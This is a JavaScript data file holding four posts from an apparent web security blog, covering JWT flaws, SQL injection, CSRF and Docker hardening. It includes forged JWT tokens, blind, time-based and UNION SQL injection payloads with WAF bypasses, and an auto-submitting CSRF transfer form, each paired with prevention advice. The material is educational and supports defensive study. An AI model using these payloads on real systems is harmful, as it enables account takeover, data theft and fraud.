// posts.js - Central post data storage

const postsData = {
    'jwt-security': {
        title: 'Exploiting JWT Vulnerabilities in Modern Web Apps',
        date: '2026-01-15',
        readTime: '5min',
        tags: ['security', 'web', 'jwt'],
        description: 'A deep dive into JSON Web Token security flaws and exploitation techniques',
        content: `
            <h1 class="single-title">Exploiting JWT Vulnerabilities in Modern Web Apps</h1>
            <div class="metadata">
                2026-01-15 | <i data-feather="clock" style="width:14px;height:14px"></i> 5min
                <div class="post-tags tags">
                    <a href="tags.html?tag=security">security</a>
                    <a href="tags.html?tag=web">web</a>
                    <a href="tags.html?tag=jwt">jwt</a>
                </div>
            </div>

            <h2>Introduction</h2>
            <p>JSON Web Tokens (JWT) have become the de facto standard for API authentication in modern web applications. However, improper implementation can lead to severe security vulnerabilities. In this writeup, we'll explore common JWT vulnerabilities and how to exploit them.</p>

            <h2>Understanding JWT Structure</h2>
            <p>A JWT consists of three parts separated by dots:</p>
            <pre><code>header.payload.signature</code></pre>

            <p>Each part is base64url encoded. Let's break down an example token:</p>

            <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>

            <h3>Header</h3>
            <p>The header typically consists of two parts: the token type and the signing algorithm:</p>
            <pre><code>{
  "alg": "HS256",
  "typ": "JWT"
}</code></pre>

            <h3>Payload</h3>
            <p>The payload contains the claims (statements about the user and additional data):</p>
            <pre><code>{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "role": "user"
}</code></pre>

            <h2>Common Vulnerabilities</h2>

            <h3>1. Algorithm Confusion (alg: none)</h3>
            <p>One of the most critical vulnerabilities is accepting unsigned tokens. Some JWT libraries allow the "none" algorithm, which means no signature is required.</p>

            <p><strong>Exploitation:</strong></p>
            <ol>
                <li>Decode the JWT token</li>
                <li>Change the algorithm to "none"</li>
                <li>Modify the payload as needed</li>
                <li>Remove the signature</li>
            </ol>

            <pre><code>// Original header
{"alg": "HS256", "typ": "JWT"}

// Modified header
{"alg": "none", "typ": "JWT"}

// Modified token (notice the trailing dot)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.</code></pre>

            <h3>2. Weak Secret Keys</h3>
            <p>When HMAC algorithms (HS256, HS384, HS512) are used with weak secrets, attackers can brute-force the secret key.</p>

            <blockquote>
                <p><strong>Pro tip:</strong> Use tools like <code>jwt_tool</code> or <code>hashcat</code> to crack weak JWT secrets. A wordlist attack often succeeds when developers use common passwords as secret keys.</p>
            </blockquote>

            <h3>3. Key Confusion Attack</h3>
            <p>This occurs when an application accepts both symmetric (HS256) and asymmetric (RS256) algorithms, and the public key can be used as the HMAC secret.</p>

            <pre><code>// Python example for key confusion
import jwt
import base64

# Get the public key from the server
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Create malicious token using public key as HMAC secret
payload = {"sub": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm="HS256")</code></pre>

            <h2>Real-World Impact</h2>
            <p>JWT vulnerabilities can lead to:</p>
            <ul>
                <li>Account takeover</li>
                <li>Privilege escalation (user → admin)</li>
                <li>Unauthorized access to sensitive data</li>
                <li>Complete application compromise</li>
            </ul>

            <h2>Prevention Best Practices</h2>

            <h4>1. Never Trust User Input</h4>
            <pre><code>// Bad - Trusting the algorithm from the token
const decoded = jwt.verify(token, secret, {
    algorithms: [getAlgFromToken(token)]
});

// Good - Explicitly specify allowed algorithms
const decoded = jwt.verify(token, secret, {
    algorithms: ['RS256']
});</code></pre>

            <h4>2. Use Strong Secrets</h4>
            <ul>
                <li>Minimum 256 bits (32 bytes) for HS256</li>
                <li>Use cryptographically secure random generators</li>
                <li>Rotate secrets regularly</li>
            </ul>

            <h4>3. Implement Token Expiration</h4>
            <pre><code>{
  "exp": 1516239022,  // Expiration time
  "iat": 1516235422,  // Issued at
  "nbf": 1516235422   // Not valid before
}</code></pre>

            <h4>4. Validate All Claims</h4>
            <pre><code>// Validate issuer, audience, and expiration
const decoded = jwt.verify(token, secret, {
    algorithms: ['RS256'],
    issuer: 'your-app',
    audience: 'your-api',
    clockTolerance: 0
});</code></pre>

            <h2>Testing Tools</h2>
            <p>Essential tools for JWT security testing:</p>
            <ul>
                <li><strong>jwt_tool</strong> - Swiss army knife for JWT testing</li>
                <li><strong>jwt.io</strong> - Online decoder and debugger</li>
                <li><strong>Burp Suite</strong> - With JWT extensions</li>
                <li><strong>hashcat</strong> - For cracking weak secrets</li>
            </ul>

            <h2>Conclusion</h2>
            <p>JWT tokens are powerful but must be implemented correctly. Always validate the algorithm, use strong secrets, implement proper expiration, and never trust user-controlled input. Regular security audits and penetration testing can help identify vulnerabilities before they're exploited.</p>

            <hr>

            <p><em>Want to learn more about web security? Check out my other writeups on <a href="posts.html">SQL injection</a>, <a href="posts.html">XSS attacks</a>, and <a href="posts.html">API security</a>.</em></p>
        `
    },
    'sql-injection': {
        title: 'Advanced SQL Injection Techniques',
        date: '2026-01-10',
        readTime: '8min',
        tags: ['security', 'sql', 'database'],
        description: 'Exploring blind SQL injection, time-based attacks, and bypass methods',
        content: `
            <h1 class="single-title">Advanced SQL Injection Techniques</h1>
            <div class="metadata">
                2026-01-10 | <i data-feather="clock" style="width:14px;height:14px"></i> 8min
                <div class="post-tags tags">
                    <a href="tags.html?tag=security">security</a>
                    <a href="tags.html?tag=sql">sql</a>
                    <a href="tags.html?tag=database">database</a>
                </div>
            </div>

            <h2>Introduction</h2>
            <p>SQL injection remains one of the most critical web application vulnerabilities. This writeup covers advanced techniques including blind SQL injection, time-based attacks, and WAF bypass methods.</p>

            <h2>Understanding SQL Injection</h2>
            <p>SQL injection occurs when user input is improperly sanitized and concatenated directly into SQL queries.</p>

            <h3>Basic Example</h3>
            <pre><code>// Vulnerable code
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";

// Malicious input
user=' OR '1'='1

// Resulting query
SELECT * FROM users WHERE username = '' OR '1'='1'</code></pre>

            <h2>Blind SQL Injection</h2>
            <p>When the application doesn't display database errors, we need to use blind techniques to extract data.</p>

            <h3>Boolean-Based Blind SQLi</h3>
            <pre><code>// Check if first character of admin password is 'a'
admin' AND SUBSTRING(password,1,1)='a'--

// Binary search approach
admin' AND ASCII(SUBSTRING(password,1,1)) > 100--</code></pre>

            <h3>Time-Based Blind SQLi</h3>
            <pre><code>// MySQL
admin' AND IF(ASCII(SUBSTRING(password,1,1))>100,SLEEP(5),0)--

// PostgreSQL
admin'; SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))>100) THEN pg_sleep(5) END--

// MSSQL
admin'; IF (ASCII(SUBSTRING(password,1,1))>100) WAITFOR DELAY '00:00:05'--</code></pre>

            <h2>Union-Based Injection</h2>
            <p>Extract data by combining results with UNION statements.</p>

            <pre><code>// Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  # Error = 2 columns

// Extract data
' UNION SELECT username,password FROM users--

// Get database version
' UNION SELECT NULL,@@version--</code></pre>

            <h2>WAF Bypass Techniques</h2>

            <h3>Case Manipulation</h3>
            <pre><code>SeLeCt * FrOm users</code></pre>

            <h3>Comment Injection</h3>
            <pre><code>SELECT/**/username/**/FROM/**/users
SEL/*comment*/ECT * FROM users</code></pre>

            <h3>Encoding</h3>
            <pre><code>// URL encoding
%53%45%4c%45%43%54

// Double encoding
%2553%2545%254c%2545%2543%2554

// Hex encoding
0x53454c454354</code></pre>

            <h2>Automated Tools</h2>
            <p>Essential tools for SQL injection testing:</p>
            <ul>
                <li><strong>sqlmap</strong> - Automated SQL injection tool</li>
                <li><strong>Burp Suite</strong> - Manual testing with Intruder</li>
                <li><strong>NoSQLMap</strong> - For NoSQL injection</li>
            </ul>

            <h2>Prevention</h2>
            <p>Always use prepared statements and parameterized queries:</p>

            <pre><code>// PHP PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');
$stmt->execute([$username]);

// Node.js
db.query('SELECT * FROM users WHERE username = $1', [username]);

// Python
cursor.execute('SELECT * FROM users WHERE username = %s', (username,))</code></pre>

            <h2>Conclusion</h2>
            <p>SQL injection is preventable but requires discipline. Always use parameterized queries, implement input validation, apply least privilege principles, and conduct regular security audits.</p>
        `
    },
    'csrf-explained': {
        title: 'Understanding CSRF Attacks and Prevention',
        date: '2025-12-28',
        readTime: '4min',
        tags: ['security', 'web'],
        description: 'Cross-Site Request Forgery explained with practical examples and mitigation strategies',
        content: `
            <h1 class="single-title">Understanding CSRF Attacks and Prevention</h1>
            <div class="metadata">
                2025-12-28 | <i data-feather="clock" style="width:14px;height:14px"></i> 4min
                <div class="post-tags tags">
                    <a href="tags.html?tag=security">security</a>
                    <a href="tags.html?tag=web">web</a>
                </div>
            </div>

            <h2>What is CSRF?</h2>
            <p>Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application. The attacker tricks the victim's browser into sending malicious requests using the victim's credentials.</p>

            <h2>How CSRF Works</h2>
            <p>CSRF attacks exploit the trust that a web application has in the user's browser. If a user is authenticated to a website, their browser will automatically include authentication cookies with every request to that site.</p>

            <h3>Attack Example</h3>
            <pre><code><!-- Malicious site with hidden form -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker-account">
</form>
<script>
  document.forms[0].submit();
</script></code></pre>

            <h2>Real-World Impact</h2>
            <ul>
                <li>Unauthorized fund transfers</li>
                <li>Account settings changes</li>
                <li>Password modifications</li>
                <li>Email address updates</li>
                <li>Social media actions (likes, posts, follows)</li>
            </ul>

            <h2>Prevention Methods</h2>

            <h3>1. CSRF Tokens</h3>
            <p>Generate a unique token for each session and include it in forms:</p>
            <pre><code><!-- Server generates and validates token -->
<form method="POST">
  <input type="hidden" name="csrf_token" value="abc123...">
  <input name="email" type="email">
  <button>Submit</button>
</form></code></pre>

            <h3>2. SameSite Cookie Attribute</h3>
            <pre><code>Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly</code></pre>

            <h3>3. Double Submit Cookie</h3>
            <pre><code>// Set CSRF token in cookie and form
document.cookie = "csrf_token=" + token;
formData.append("csrf_token", token);</code></pre>

            <h3>4. Custom Headers</h3>
            <pre><code>// Add custom header to AJAX requests
fetch('/api/data', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  }
});</code></pre>

            <h2>Implementation Example (Express.js)</h2>
            <pre><code>const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/submit', csrfProtection, (req, res) => {
  // Token is validated automatically
  res.send('Form submitted!');
});</code></pre>

            <h2>Best Practices</h2>
            <ul>
                <li>Always use CSRF protection for state-changing operations</li>
                <li>Implement SameSite cookies as an additional layer</li>
                <li>Require re-authentication for sensitive actions</li>
                <li>Use proper HTTP methods (GET for reading, POST for modifications)</li>
                <li>Validate the origin and referer headers</li>
            </ul>

            <h2>Conclusion</h2>
            <p>CSRF attacks are preventable with proper implementation of tokens, secure cookies, and validation. Always protect state-changing operations and never rely solely on cookies for authentication.</p>
        `
    },
    'docker-security': {
        title: 'Docker Container Security Best Practices',
        date: '2025-12-20',
        readTime: '7min',
        tags: ['docker', 'security', 'devops'],
        description: 'Essential security practices for containerized applications and infrastructure',
        content: `
            <h1 class="single-title">Docker Container Security Best Practices</h1>
            <div class="metadata">
                2025-12-20 | <i data-feather="clock" style="width:14px;height:14px"></i> 7min
                <div class="post-tags tags">
                    <a href="tags.html?tag=docker">docker</a>
                    <a href="tags.html?tag=security">security</a>
                    <a href="tags.html?tag=devops">devops</a>
                </div>
            </div>

            <h2>Introduction</h2>
            <p>Docker containers have become the standard for deploying applications, but they introduce unique security challenges. This guide covers essential security practices for containerized applications.</p>

            <h2>Image Security</h2>

            <h3>1. Use Official Base Images</h3>
            <pre><code># Good - Official minimal image
FROM node:18-alpine

# Avoid - Unknown sources
FROM random-user/custom-node</code></pre>

            <h3>2. Minimize Image Layers</h3>
            <pre><code># Bad - Multiple layers
RUN apt-get update
RUN apt-get install -y package1
RUN apt-get install -y package2

# Good - Combined in one layer
RUN apt-get update && apt-get install -y \
    package1 \
    package2 \
    && rm -rf /var/lib/apt/lists/*</code></pre>

            <h3>3. Don't Run as Root</h3>
            <pre><code>FROM node:18-alpine

# Create non-root user
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

# Set ownership
COPY --chown=nodejs:nodejs . /app

# Switch to non-root user
USER nodejs

WORKDIR /app
CMD ["node", "server.js"]</code></pre>

            <h2>Runtime Security</h2>

            <h3>1. Limit Container Capabilities</h3>
            <pre><code>docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp</code></pre>

            <h3>2. Use Read-Only File Systems</h3>
            <pre><code>docker run --read-only --tmpfs /tmp myapp</code></pre>

            <h3>3. Set Resource Limits</h3>
            <pre><code>docker run \
  --memory="512m" \
  --cpus="1.0" \
  --pids-limit=100 \
  myapp</code></pre>

            <h2>Network Security</h2>

            <h3>1. Use User-Defined Networks</h3>
            <pre><code>docker network create --driver bridge myapp-network
docker run --network=myapp-network myapp</code></pre>

            <h3>2. Disable Inter-Container Communication</h3>
            <pre><code>docker network create --driver bridge --opt com.docker.network.bridge.enable_icc=false secure-network</code></pre>

            <h2>Secrets Management</h2>

            <h3>Don't Hardcode Secrets</h3>
            <pre><code># Bad
ENV DB_PASSWORD=supersecret

# Good - Use secrets
docker secret create db_password ./password.txt
docker service create --secret db_password myapp</code></pre>

            <h2>Docker Compose Security</h2>
            <pre><code>version: '3.8'

services:
  app:
    image: myapp:latest
    user: "1001:1001"
    read_only: true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    security_opt:
      - no-new-privileges:true
    tmpfs:
      - /tmp
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
    networks:
      - app-network
    secrets:
      - db_password

secrets:
  db_password:
    external: true

networks:
  app-network:
    driver: bridge</code></pre>

            <h2>Image Scanning</h2>
            <pre><code># Scan image for vulnerabilities
docker scan myapp:latest

# Use Trivy
trivy image myapp:latest

# Integrate in CI/CD
docker build -t myapp:latest .
trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest</code></pre>

            <h2>Security Checklist</h2>
            <ul>
                <li>✅ Use minimal base images (Alpine, distroless)</li>
                <li>✅ Run as non-root user</li>
                <li>✅ Drop unnecessary capabilities</li>
                <li>✅ Use read-only file systems where possible</li>
                <li>✅ Set resource limits</li>
                <li>✅ Scan images for vulnerabilities</li>
                <li>✅ Keep images updated</li>
                <li>✅ Use secrets management</li>
                <li>✅ Enable Docker Content Trust</li>
                <li>✅ Implement network segmentation</li>
            </ul>

            <h2>Monitoring and Logging</h2>
            <pre><code># Enable logging driver
docker run --log-driver=json-file --log-opt max-size=10m myapp

# Monitor container events
docker events --filter 'type=container'</code></pre>

            <h2>Conclusion</h2>
            <p>Container security requires a layered approach covering images, runtime, networking, and secrets. Regular scanning, proper configuration, and following the principle of least privilege are essential for maintaining secure containerized applications.</p>
        `
    }
};